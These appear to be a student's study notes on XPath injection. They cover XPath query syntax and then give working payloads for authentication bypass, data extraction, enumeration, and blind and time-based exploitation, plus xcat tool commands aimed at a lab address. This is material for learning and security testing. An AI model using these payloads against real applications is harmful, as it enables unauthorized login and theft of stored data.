# Injection Attacks

## XPath Injection

### Queriy Basics

#### Base Case

| Query                    | Explanation                                      |
|--------------------------|--------------------------------------------------|
| module                   | Select all module child nodes of the context node |
| /                        | Select the document root node                    |
| //                       | Select descendant nodes of the context node      |
| .                        | Select the context node                          |
| ..                       | Select the parent node of the context node       |
| @difficulty              | Select the difficulty attribute node             |
| text()                   | Select all text node child nodes                 |

#### Base Case Examples

| Queries                           | Explanation                                                                 |
|-------------------------------------------|-----------------------------------------------------------------------------|
| /academy_modules/module                   | Select all module child nodes of academy_modules node                       |
| //module                                  | Select all module nodes                                                     |
| /academy_modules//title                   | Select all title nodes that are descendants of the academy_modules node     |
| /academy_modules/module/tier/@difficulty  | Select the difficulty attribute node of all tier element nodes under the specified path |
| //@difficulty                             | Select all difficulty attribute nodes                                       |

#### Predicates

| Query | Explanation |
|-------|-------------|
| /academy_modules/module[1] | Select the first module child node of the academy_modules node |
| /academy_modules/module[position()=1] | Equivalent to the above query |
| /academy_modules/module[last()] | Select the last module child node of the academy_modules node |
| /academy_modules/module[position()<3] | Select the first two module child nodes of the academy_modules node |
| //module[tier=2]/title | Select the title of all modules where the tier element node equals 2 |
| //module/author[@co-author]/../title | Select the title of all modules where the author element node has a co-author attribute node |
| //module/tier[@difficulty="medium"]/.. | Select all modules where the tier element node has a difficulty attribute node set to medium |

#### Predicate Operands

| Operand | Explanation |
|---------|-------------|
| + | Addition |
| - | Subtraction |
| * | Multiplication |
| div | Division |
| = | Equal |
| != | Not Equal |
| < | Less than |
| <= | Less than or Equal |
| > | Greater than |
| >= | Greater than or Equal |
| or | Logical Or |
| and | Logical And |
| mod | Modulus |

#### Wildcards

| Query | Explanation |
|-------|-------------|
| node() | Matches any node |
| * | Matches any element node |
| @* | Matches any attribute node |

#### Wildcard Examples

| Query | Explanation |
|-------|-------------|
| //* | Select all element nodes in the document |
| //module/author[@*]/.. | Select all modules where the author element node has at least one attribute node of any kind |
| /\*/\*/title | Select all title nodes that are exactly two levels below the document root |

#### Unions

| Query | Explanation |
|-------|-------------|
| //module[tier=2]/title/text() \| //module[tier=3]/title/text() | Select the title of all modules in tiers 2 and 3 |

## Authentication bypass

- `' or '1'='1` in username and password field, returns first user entry, doesn't work when password hashed
- `' or true() or '` in username field, returns first entry, bypasses hashed password
- `' or position()=n or '` in username field, use to enumarate users, returns nth user entry, bypasses password hash
- `' or contains(.,'admin') or '` in username field, returns entries with 'admin' in the name, bypasses password hash

## Data Exfiltration

- `') or ('1'='1` insert into parameters to confirm XPath injection
- `GET /index.php?q=')+and+('1'='2&f=fullstreetname+|+//text() HTTP/1.1` append a new query to return all text nodes
- `/a/b/c[contains(d/text(), '') or ('1'='1')]/../../..//text()` same result as previous but requires knowing the schema depth

### Enumeration

- `?q=')+and+('1'='2&f=fullstreetname+|+/*[1]` used to chack query depth, nothing returned from original query, incrementally append further `/*[1]` until responses change > correct result > no result, correct result is the depth of path 1,1,1,1 (1,2,1,1,1,1 could have a deeper path etc).
- Once depth known can start enumerating through records, again when no result recieved the previous was the last entry
    - `|+/*[1]+/*[1]+/*[1]+/*[1]`
    - `|+/*[1]+/*[1]+/*[1]+/*[2]`
    - `|+/*[1]+/*[1]+/*[1]+/*[2]`
    - `|+/*[1]+/*[1]+/*[1]+/*[4]`
- and so on
    - `|+/*[1]+/*[1]+/*[2]+/*[1]`
    - `|+/*[1]+/*[1]+/*[2]+/*[2]`
    - `|+/*[1]+/*[1]+/*[2]+/*[2]`
    - `|+/*[1]+/*[1]+/*[2]+/*[4]`
- `q: ') and (position()>0) and ('1'='1`another method using the predicate, see how many data items are returned and increment `0` by that many to get the next batch and repeat (restricted to the node being quried)

## Blind Exploitation

- `invalid' or '1'='1` used to confirm exploitable if form responds differently for valid and invalid entries
- `invalid' or string-length(name(/*[1]))=n and '1'='1` check if the length of the root element node's name is `n`, if treated as valid then node name length is `n`
- `invalid' or substring(name(/*[1]),1,1)='a' and '1'='1` find the nodes name letter by letter
- `invalid' or count(/users/*)=n and '1'='1` to find the n number of children of the users node
- `invalid' or string-length(/users/user[1]/username)=n and '1'='1` calculate the length `n` of the username value for the 1st user under the users node
- `invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1` find the value of the first letter of the the first users username

## Time-based Exploitation

- `invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1` causes time delay if condition is correct by forcing iteration over entire xml document exponentially

## Tools

[**xcat**](https://github.com/orf/xcat)

### Basic Commands

| Command     | Description |
|-------------|-------------|
| detect      | detect XPath injection and print the type of injection found |
| injections  | print all types of injection supported by xcat |
| ip          | print the current external IP address |
| run         | retrieve the XML document by exploiting the XPath injection |
| shell       | xcat shell to run system commands |

### Examples

```bash
pip3 install cython
pip3 install xcat
xcat detect http://172.17.0.2/index.php q q=BAR f=fullstreetname --true-string='!No Result' # get request expecting 2 params q and f
xcat run http://172.17.0.2/index.php q q=BAR f=fullstreetname --true-string='!No Result'
xcat detect http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM # post request will be successful if the username is correct
xcat run http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM
```

